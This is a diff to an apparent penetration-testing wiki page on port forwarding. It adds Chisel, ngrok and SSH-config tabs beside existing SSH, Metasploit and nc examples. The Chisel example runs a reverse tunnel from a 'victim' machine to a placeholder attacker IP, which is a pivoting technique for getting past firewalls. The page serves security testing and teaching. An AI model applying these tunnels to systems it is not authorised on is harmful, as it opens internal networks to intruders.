@@ -28,7 +28,9 @@ While setting up port forwarding, it's important to remember that non-admin user
 Port forwarding can be set up in many different ways.
 
 {% tabs %}
-{% tab title="SSH commands" %}
+{% tab title="SSH" %}
+## SSH commands
+
 One of the most easy is by relying on SSH however, it requires to have an SSH server running on the controlled machine and a valid account. The tester needs to open an SSH connection to the machine that should be turned into a SOCKS proxy, and supply&#x20;
 
 * the `-L` option for a local port forwarding, along with the ports and addresses to bind
@@ -45,10 +47,27 @@ ssh -N -R $REMOTE_ADDRESS:$REMOTE_PORT:$LOCAL_ADDRESS:$LOCAL_PORT user@target
 ```
 
 Once the ssh command exits successful (or once a session opens) the tester can then proceed to use the tunnel.
+
+
+
+## SSH configs
+
+The same operations can be conducted through a pre-configured agent instead of using command-line argument. TODO
 {% endtab %}
 
-{% tab title="SSH config" %}
+{% tab title="Chisel" %}
+Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.
 
+```bash
+# Attacker machine
+chisel server -p $ATTACKER_PORT -reverse
+# Victime machine
+.\chisel.exe client $ATTACKER_IP:$ATTACKER_PORT R:$REMOTE_PORT:localhost:$LOCAL_PORT
+```
+
+{% hint style="info" %}
+Chisel binaries can be downloaded from [the official GitHub repository](https://github.com/jpillora/chisel/releases).
+{% endhint %}
 {% endtab %}
 
 {% tab title="Metasploit" %}
@@ -74,7 +93,7 @@ portfwd flush
 {% endtab %}
 
 {% tab title="plink" %}
-
+TODO
 {% endtab %}
 
 {% tab title="nc" %}
@@ -82,6 +101,21 @@ From a UNIX-like host, the `nc` utility can be used to setup local port forwardi
 
 ```bash
 nc -lvk $LOCAL_ADDRESS $LOCAL_PORT -c "nc -v $REMOTE_ADDRESS $REMOTE_PORT"
+```
+{% endtab %}
+
+{% tab title="ngrok" %}
+[Ngrok](https://github.com/inconshreveable/ngrok) (Go) is a tool that allows to expose a local web server to the Internet. Upon command execution, the tool will output the Internet-facing address that's configured for port forwarding to the local service.
+
+```bash
+# Expose a local HTTP service on a given port:
+ngrok http $LOCAL_PORT
+
+# Expose a local HTTPS server:
+ngrok http https://localhost
+
+# Expose raw TCP traffic on a given port:
+ngrok tcp $LOCAL_PORT
 ```
 {% endtab %}
 {% endtabs %}
